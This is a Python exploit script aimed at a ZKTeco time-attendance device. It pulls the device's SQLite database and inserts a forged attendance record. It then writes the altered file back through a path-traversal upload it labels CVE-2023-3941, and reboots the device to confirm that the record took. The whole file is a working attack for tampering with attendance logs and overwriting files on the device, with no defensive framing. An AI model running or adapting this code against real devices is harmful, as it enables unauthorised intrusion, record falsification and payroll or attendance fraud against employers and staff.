#!/usr/bin/env python3
"""Improved roundtrip with proper PREPARE_DATA handling + state recovery."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time, sqlite3, os
from zk import ZK, const
from struct import pack, unpack

DEVICE_IP = '172.16.0.214'
OUT_DIR = 'D:\\chamcong\\zk_inject_workspace'

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def free_data(conn):
    """Clear device buffer."""
    send_cmd(conn, const.CMD_FREE_DATA, b'')

def download_zkdb_properly(conn, output_path):
    """Download ZKDB.db using pyzk's read_with_buffer pattern."""
    # Use the proper buffered read command (CMD_DATA_WRRQ = 1503)
    # Format: '<bhii' with header byte 1, command, fct, ext
    command_string = pack('<bhii', 1, 0x6A6, 0, 0)
    r = send_cmd(conn, 1503, command_string)
    print('  Buffered read initial:', r)

    if r.get('code') == 1501:  # CMD_DATA - data came immediately
        sock = conn._ZK__sock
        sock.settimeout(15)
        data = b''
        chunks = 0
        # Read until we get a chunk with body that's less than max
        while True:
            try:
                chunk = sock.recv(65536)
                if not chunk: break
                if len(chunk) >= 16:
                    top1, top2, tcp_len = unpack('<HHI', chunk[:8])
                    zk_cmd = unpack('<H', chunk[8:10])[0]
                    body = chunk[16:16+(tcp_len - 8)] if tcp_len > 8 else b''
                    data += body
                    chunks += 1
                    # Stop conditions
                    if zk_cmd == 0x07D0:  # ACK_OK
                        break
                    # If we got full chunks for a while and then no more
                    if tcp_len < 1024:
                        break
                if chunks > 3000: break
            except socket.timeout: break
        print('  Chunks: {}, bytes: {}'.format(chunks, len(data)))
        with open(output_path, 'wb') as f: f.write(data)
        return data
    elif r.get('code') == 1500:  # PREPARE_DATA
        # Size comes next
        size = r.get('error', 0)
        # Actually need to read raw
        sock = conn._ZK__sock
        sock.settimeout(15)
        total_size = 0
        data = b''
        # Just receive raw
        while True:
            try:
                chunk = sock.recv(65536)
                if not chunk: break
                if len(chunk) >= 16:
                    top1, top2, tcp_len = unpack('<HHI', chunk[:8])
                    zk_cmd = unpack('<H', chunk[8:10])[0]
                    body = chunk[16:16+(tcp_len - 8)] if tcp_len > 8 else b''
                    data += body
                    if zk_cmd == 0x07D0: break
                    if tcp_len < 1024: break
            except socket.timeout: break
        with open(output_path, 'wb') as f: f.write(data)
        return data
    return None

def upload_via_picture(conn, target_path, data):
    parts = target_path.split('/')
    traversal = ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + "/".join(parts)
    filename = traversal.encode() + b'\x00'

    # Clear buffer first
    free_data(conn)
    time.sleep(0.5)

    size = len(data)
    r1 = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', size))
    if not r1.get('status'):
        return {'error': 'PREPARE failed', 'r1': r1}
    MAX_CHUNK = 1024
    remain = size % MAX_CHUNK
    packets = (size - remain) // MAX_CHUNK
    for i in range(packets):
        r = send_cmd(conn, const.CMD_DATA, data[i*MAX_CHUNK:(i+1)*MAX_CHUNK])
        if not r.get('status'):
            return {'error': 'chunk fail'}
    if remain:
        r = send_cmd(conn, const.CMD_DATA, data[packets*MAX_CHUNK:])
    free_data(conn)
    r3 = send_cmd(conn, 0x272B, filename)
    return {'PREPARE': r1, 'UPLOAD': r3}

os.makedirs(OUT_DIR, exist_ok=True)

zk = ZK(DEVICE_IP, port=4370, timeout=15, password=0)
conn = zk.connect()
print('[+] Connected:', conn.get_firmware_version(), conn.get_platform())

# Get before counts
try:
    before_att = conn.get_attendance_count()
    print('[*] BEFORE: ATTLOG={}'.format(before_att))
except: before_att = None

try:
    conn.disable_device()
except: pass

# Clear state
free_data(conn)
time.sleep(1)

# === Step 1: Download ZKDB.db via proper buffered read ===
print('\n[*] Downloading ZKDB.db using DATA_WRRQ 1503...')
zkdb_local = os.path.join(OUT_DIR, 'downloaded_' + str(int(time.time())) + '.db')
data = download_zkdb_properly(conn, zkdb_local)

if data and data[:15] == b'SQLite format 3':
    print('[+] Got valid SQLite: {} bytes'.format(len(data)))
    try:
        db = sqlite3.connect(zkdb_local)
        cur = db.cursor()
        cur.execute('SELECT COUNT(*) FROM ATT_LOG')
        cnt = cur.fetchone()[0]
        print('  ATT_LOG count: {}'.format(cnt))
        db.close()
    except Exception as e:
        print('  SQLite error:', e)
else:
    print('[!] Download failed, size={}'.format(len(data) if data else 0))
    # Skip upload
    try:
        conn.enable_device()
    except: pass
    try:
        conn.disconnect()
    except: pass
    exit(1)

# === Step 2: Inject ATTLOG records ===
print('\n[*] Injecting ATTLOG records...')
try:
    db = sqlite3.connect(zkdb_local)
    cur = db.cursor()
    cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='ATT_LOG'")
    if cur.fetchone():
        cur.execute('SELECT COUNT(*) FROM ATT_LOG')
        old_cnt = cur.fetchone()[0]
        # Inject test record
        test_time = '2026-09-16T08:00:00'
        cur.execute('''INSERT INTO ATT_LOG (User_PIN, Verify_Type, Verify_Time, Status, Work_Code_ID, Sensor_NO, Att_Flag, CREATE_ID, MODIFY_TIME, SEND_FLAG)
                      VALUES (?, 1, ?, 0, 0, 0, 0, NULL, NULL, 0)''', ('1', test_time))
        cur.execute('SELECT COUNT(*) FROM ATT_LOG')
        new_cnt = cur.fetchone()[0]
        print('  Injected 1 record: {} -> {}'.format(old_cnt, new_cnt))
        db.commit()
    db.close()
except Exception as e:
    print('[!] Inject failed:', e)

# Read modified
with open(zkdb_local, 'rb') as f:
    modified = f.read()

# === Step 3: Upload via CVE-2023-3941 ===
print('\n[*] Uploading modified ZKDB.db via CVE-2023-3941...')
result = upload_via_picture(conn, 'mnt/mtdblock/data/ZKDB.db', modified)
print('  Result:', result)

time.sleep(2)

# === Step 4: Reboot ===
print('\n[*] Rebooting device...')
try:
    conn.restart()
    print('  [+] Restart sent')
except Exception as e:
    print('  [!] Restart:', e)

try: conn.enable_device()
except: pass
try: conn.disconnect()
except: pass

time.sleep(20)

# === Step 5: Reconnect + verify ===
print('\n[*] Reconnecting after reboot...')
try:
    zk2 = ZK(DEVICE_IP, port=4370, timeout=15, password=0)
    conn2 = zk2.connect()
    after_att = conn2.get_attendance_count()
    print('[*] AFTER reboot: ATTLOG={}'.format(after_att))
    if before_att is not None and after_att > before_att:
        print('\n[+] ATTLOG INJECTION SUCCESS! Delta: +{}'.format(after_att - before_att))
    conn2.disconnect()
except Exception as e:
    print('[!] Reconnect failed:', e)

print('\n[+] Done')
